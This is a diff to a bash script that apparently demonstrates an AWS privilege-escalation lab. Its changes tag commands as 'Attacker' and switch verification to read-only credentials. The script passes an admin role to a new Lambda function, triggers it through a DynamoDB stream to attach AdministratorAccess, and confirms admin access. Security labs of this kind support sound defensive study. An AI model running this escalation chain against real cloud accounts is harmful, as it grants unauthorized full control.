@@ -24,13 +24,30 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
+}
+
+# Helper functions for credential switching
+use_starting_user_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    export AWS_REGION="$AWS_REGION"
+    unset AWS_SESSION_TOKEN
+}
+
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    export AWS_REGION="$AWS_REGION"
+    unset AWS_SESSION_TOKEN
 }
 
 # Configuration
@@ -65,12 +82,12 @@ if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; 
     exit 1
 fi
 
-# Get admin credentials for verification steps
-ADMIN_ACCESS_KEY_ID=$(terraform output -raw prod_admin_user_for_cleanup_access_key_id 2>/dev/null)
-ADMIN_SECRET_ACCESS_KEY=$(terraform output -raw prod_admin_user_for_cleanup_secret_access_key 2>/dev/null)
+# Get readonly credentials for verification steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
 
-if [ -z "$ADMIN_ACCESS_KEY_ID" ]; then
-    echo -e "${YELLOW}Warning: Could not retrieve admin credentials from Terraform${NC}"
+if [ -z "$READONLY_ACCESS_KEY" ]; then
+    echo -e "${YELLOW}Warning: Could not retrieve readonly credentials from Terraform${NC}"
     echo -e "${YELLOW}Policy verification may not work properly${NC}"
 fi
 
@@ -92,15 +109,12 @@ cd - > /dev/null
 
 # Step 2: Configure AWS credentials with starting user
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
-export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
+use_starting_user_creds
 
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -112,7 +126,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "aws sts get-caller-identity --query 'Account' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -120,7 +134,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
-show_cmd "aws iam list-users --max-items 1"
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -132,7 +146,7 @@ echo ""
 echo -e "${YELLOW}Step 5: Getting DynamoDB stream ARN${NC}"
 echo "Describing DynamoDB table: $DYNAMODB_TABLE"
 
-show_cmd "aws dynamodb describe-table --region $AWS_REGION --table-name $DYNAMODB_TABLE --query 'Table.LatestStreamArn' --output text"
+show_cmd "Attacker" "aws dynamodb describe-table --region $AWS_REGION --table-name $DYNAMODB_TABLE --query 'Table.LatestStreamArn' --output text"
 DYNAMODB_STREAM_ARN=$(aws dynamodb describe-table \
     --region $AWS_REGION \
     --table-name $DYNAMODB_TABLE \
@@ -204,7 +218,7 @@ echo "This is the privilege escalation vector - passing the admin role to Lambda
 TARGET_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${TARGET_ROLE}"
 echo "Target Role ARN: $TARGET_ROLE_ARN"
 
-show_attack_cmd "aws lambda create-function --region $AWS_REGION --function-name \"$LAMBDA_FUNCTION_NAME\" --runtime \"python3.11\" --role \"$TARGET_ROLE_ARN\" --handler \"lambda_function.lambda_handler\" --zip-file \"fileb:///tmp/lambda_function.zip\" --timeout 30 --environment \"Variables={TARGET_USER=$STARTING_USER}\" --output json"
+show_attack_cmd "Attacker" "aws lambda create-function --region $AWS_REGION --function-name \"$LAMBDA_FUNCTION_NAME\" --runtime \"python3.11\" --role \"$TARGET_ROLE_ARN\" --handler \"lambda_function.lambda_handler\" --zip-file \"fileb:///tmp/lambda_function.zip\" --timeout 30 --environment \"Variables={TARGET_USER=$STARTING_USER}\" --output json"
 LAMBDA_RESULT=$(aws lambda create-function \
     --region $AWS_REGION \
     --function-name "$LAMBDA_FUNCTION_NAME" \
@@ -239,7 +253,7 @@ echo "Linking Lambda function to DynamoDB stream trigger..."
 echo "Function: $LAMBDA_FUNCTION_NAME"
 echo "Stream: $DYNAMODB_STREAM_ARN"
 
-show_attack_cmd "aws lambda create-event-source-mapping --region $AWS_REGION --function-name \"$LAMBDA_FUNCTION_NAME\" --event-source-arn \"$DYNAMODB_STREAM_ARN\" --starting-position LATEST --output json"
+show_attack_cmd "Attacker" "aws lambda create-event-source-mapping --region $AWS_REGION --function-name \"$LAMBDA_FUNCTION_NAME\" --event-source-arn \"$DYNAMODB_STREAM_ARN\" --starting-position LATEST --output json"
 EVENT_SOURCE_MAPPING=$(aws lambda create-event-source-mapping \
     --region $AWS_REGION \
     --function-name "$LAMBDA_FUNCTION_NAME" \
@@ -296,11 +310,8 @@ echo "Note: Event source mappings take time to fully initialize even after showi
 echo "We'll insert DynamoDB records every 10 seconds and check for policy attachment..."
 echo ""
 
-# Use admin credentials to check policy attachment
-export AWS_ACCESS_KEY_ID="$ADMIN_ACCESS_KEY_ID"
-export AWS_SECRET_ACCESS_KEY="$ADMIN_SECRET_ACCESS_KEY"
-export AWS_REGION="$AWS_REGION"
-unset AWS_SESSION_TOKEN
+# Use readonly credentials to check policy attachment
+use_readonly_creds
 
 MAX_ATTEMPTS=30  # 30 attempts * 10 seconds = 5 minutes max
 ATTEMPT=0
@@ -310,11 +321,8 @@ while [ $ATTEMPT -lt $MAX_ATTEMPTS ]; do
     ATTEMPT=$((ATTEMPT + 1))
     echo -e "${BLUE}Attempt $ATTEMPT/$MAX_ATTEMPTS: Inserting DynamoDB record...${NC}"
 
-    # Switch to starting user credentials to insert record
-    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
-    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
-    export AWS_REGION="$AWS_REGION"
-    unset AWS_SESSION_TOKEN
+    # Switch to attacker credentials to insert record
+    use_starting_user_creds
 
     # Insert a new record
     aws dynamodb put-item \
@@ -335,11 +343,8 @@ while [ $ATTEMPT -lt $MAX_ATTEMPTS ]; do
     # Wait a bit for Lambda to potentially execute
     sleep 5
 
-    # Switch to admin credentials to check policy attachment
-    export AWS_ACCESS_KEY_ID="$ADMIN_ACCESS_KEY_ID"
-    export AWS_SECRET_ACCESS_KEY="$ADMIN_SECRET_ACCESS_KEY"
-    export AWS_REGION="$AWS_REGION"
-    unset AWS_SESSION_TOKEN
+    # Switch to readonly credentials to check policy attachment
+    use_readonly_creds
 
     # Check if AdministratorAccess was attached
     ATTACHED_POLICIES=$(aws iam list-attached-user-policies --user-name "$STARTING_USER" --output json 2>/dev/null)
@@ -384,13 +389,10 @@ echo -e "${GREEN}✓ Policy propagated${NC}\n"
 
 # Step 13: Verify administrator access with starting user credentials
 echo -e "${YELLOW}Step 13: Verifying administrator access with starting user credentials${NC}"
-export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
-export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
-export AWS_REGION="$AWS_REGION"
-unset AWS_SESSION_TOKEN
+use_starting_user_creds
 
 echo "Attempting to list IAM users..."
-show_cmd "aws iam list-users --max-items 3 --output table"
+show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
